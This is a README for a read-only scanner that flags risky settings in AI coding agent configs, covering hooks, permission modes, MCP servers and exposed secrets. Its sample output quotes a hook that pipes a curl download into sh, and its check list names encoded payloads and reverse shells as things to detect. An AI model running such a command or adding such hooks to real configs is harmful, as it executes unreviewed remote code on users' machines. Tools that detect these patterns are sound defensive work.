# What's Allowed

What's Allowed reads your Claude Code, Codex and Cursor config and flags risky settings, each with the file, the line and a rule ID.

Examples: a hook that pipes `curl` into `sh`, an MCP server run with `npx` and no version, a repository that sets `ANTHROPIC_BASE_URL`, or a `.env` file the agent can read without asking.

Runs: [on your computer](docs/THREAT_MODEL.md#assumptions) · Sends: [nothing once installed (tested)](test/no-network.test.ts) · Won't: [change your config](test/no-writes.test.ts), or [tell you a setup is safe](docs/THREAT_MODEL.md#what-it-cant-see)

Every check publishes its test results: [docs/ACCURACY.md](docs/ACCURACY.md).

The `baseline` command writes one file of its own, `~/.whatsallowed/baseline.json`, and only when you run it. Once installed, What's Allowed sends no telemetry and makes no network calls; a test checks that on every build.

## First run

You need Node.js 20 or later. In the folder of a project you work on with an agent:

```sh
npx whatsallowed
```

To see a full report first, we recommend `npx whatsallowed demo`. It scans a made-up project with risky settings and reads none of your files.

It checks the project and your own user config (`~/.claude`, `~/.claude.json`, `~/.codex`, `~/.cursor`). A scan only reads files and changes nothing. It prints a one-line verdict first, then any findings, most important first. Each finding says what it means and what you could do about it. You make any change yourself. A summary at the end shows what each of the ten checks looked at, including those that found nothing.

```
whatsallowed 0.2.1. This is a read-only check: it changes nothing and sends nothing anywhere.

2 things to look at in the 2 files checked. 1 needs attention first.

Look at these first (1)  High: could let something run or leak without you noticing.

  A hook downloads code and runs it
    (Hook: a command that Claude Code or Codex runs by itself when something happens, such as after a file edit.)
    What this means: This hook in a repository file downloads a script and pipes it into a shell. ...
    What you could do: Download and review the script, commit it to the repository or your home folder, and run the local copy.
    Where: ./.claude/settings.json, line 3  Found: curl -s https://get.example.dev/bootstrap | sh  Rule: HOOK-001

Worth checking (1)  Medium: risky in some set-ups, harmless in others.

  MCP server "a" runs an unpinned package
    ...

Summary: this project folder and your user settings. Other projects on this machine aren't read.

  Files     2 read: Claude Code 2. Codex or Cursor: no files found.
  ...
  HOOK      1 command that runs by itself: 1 hook. 1 comes from a repository or plugin.
            These run without asking you when events happen. 1 downloads and runs code, runs an encoded payload or opens a reverse shell.
  ...
  MCP       1 MCP server (Claude Code 1): 1 started on this machine, 0 remote. The downloaded package isn't pinned to an exact version.
  ...
  DRIFT     Not checked yet: no baseline recorded. Run: npx whatsallowed baseline
  ...
```

The file, line and rule ID are on each finding's last line, for when you want to look it up. The summary has one row per check, with a count and what it means. Lower-priority notes and the full list behind each summary count are hidden unless you add `--verbose`. For scripts and other tools, `--format json` gives the same findings in a stable, machine-readable form (and `--format sarif` for GitHub code scanning).

Exit code 0 means nothing at or above the `--fail-on` level (default `high`). 1 means findings at or above the `--fail-on` level, and 2 means the tool couldn't run.

A config file over 1 MiB isn't read. It is reported as `FILE-001` (high in a repository, local or plugin file; medium in your own), so it counts toward the exit code and never reads as clean. A file we can read only in part, or not at all because it is binary, nested too deeply or the wrong shape, is named in a note instead. UTF-16 files are read as text.

## Commands

| Command | What it does |
|---|---|
| `whatsallowed [path]` | Check the project at `path` (default: current folder) and your user config |
| `whatsallowed baseline [path]` | Record your MCP server definitions in `~/.whatsallowed/baseline.json`, so later scans flag changes (`DRIFT`) |
| `whatsallowed inventory [path]` | List every config file found, with tool and scope |
| `whatsallowed rules` | List every rule ID |
| `whatsallowed demo` | Check a made-up risky setup that comes with the tool, to see what a report looks like. Reads none of your files and always exits 0 |

| Option | |
|---|---|
| `--project-only` / `--user-only` | Check one side only |
| `--format text\|json\|sarif` | SARIF 2.1.0 works with GitHub code scanning |
| `--fail-on high\|medium\|info\|never` | Exit 1 when a finding is at or above this level |
| `--baseline <file>` | Use another baseline file |
| `--reset-baseline` | With `baseline`: replace an existing baseline |
| `--verbose` | Also show lower-priority notes, and list every rule, server, hook and file behind the summary counts |
| `--no-color` | No colour (`NO_COLOR` also works) |

## In CI

```yaml
- run: npx whatsallowed --project-only --format sarif > whatsallowed.sarif || true
- uses: github/codeql-action/upload-sarif@v3
  with: { sarif_file: whatsallowed.sarif }
```

Or fail the job on medium findings: `npx whatsallowed --project-only --fail-on medium`.

## As a Claude Code plugin

```sh
claude plugin marketplace add ignore-previous/whatsallowed
claude plugin install whatsallowed@whatsallowed
```

Then ask Claude to "check my agent config". The plugin runs the same bundled CLI. It adds no hooks and runs only when asked.

## What it checks

Ten checks, 36 rules: [docs/checks.md](docs/checks.md). One rule, `FILE-001`, isn't tied to a check: it flags a config file over 1 MiB that we couldn't read. The vendor docs each check relies on: [docs/config-surface.md](docs/config-surface.md).

| Check | Looks for |
|---|---|
| MODE | Permission modes that remove prompts |
| ALLOW | Allow rules that approve any command or any domain |
| DENY | Secrets files with no `Read` deny rule |
| ENDPOINT | A repository redirecting your API traffic or credentials |
| HOOK | Hooks that download and run code, run encoded payloads or open reverse shells |
| HTTPHOOK | HTTP hooks that post to other hosts |
| MCP | Unpinned, shell-wrapped, exposed or plain-http MCP servers |
| DRIFT | MCP servers changed since your baseline |
| SECRET | Credentials in instruction files and config |
| SKILL | Skill, plugin and hook-folder scripts that download and run code |

## How accurate is it?

AI models wrote and labelled the test set, so the figures show how well each check follows its written rule. How often it catches risky settings in real projects isn't known.

[docs/ACCURACY.md](docs/ACCURACY.md) gives per-check precision and recall with 95% intervals, measured on a separate test set that was run once after tuning (later changes are listed), and lists the known misses and false alarms. Its Label agreement section says no person has labelled a case yet. Rerun it with `npm run eval`. How cases are labelled: [eval/LABELLING.md](eval/LABELLING.md).

## What it doesn't do

- It doesn't run, connect to or install any server or package named in your config, so it can't see what an MCP server does at run time or what tools it offers.
- It doesn't read prose in skills or instruction files for hidden instructions (prompt injection).
- It doesn't change your config.
- It doesn't tell you a setup is safe. It's a configuration check, not a security assessment, and a clean result only means these rules found nothing in the files they read.
- It doesn't follow a hook to a local script it runs, except scripts in skill, plugin and hooks folders.

More in [docs/THREAT_MODEL.md](docs/THREAT_MODEL.md).

## Licence

Code: MIT ([LICENSE](LICENSE)). Labelled cases in `eval/cases`: CC BY 4.0 ([LICENSE-DATA](LICENSE-DATA)).

Built with Claude.
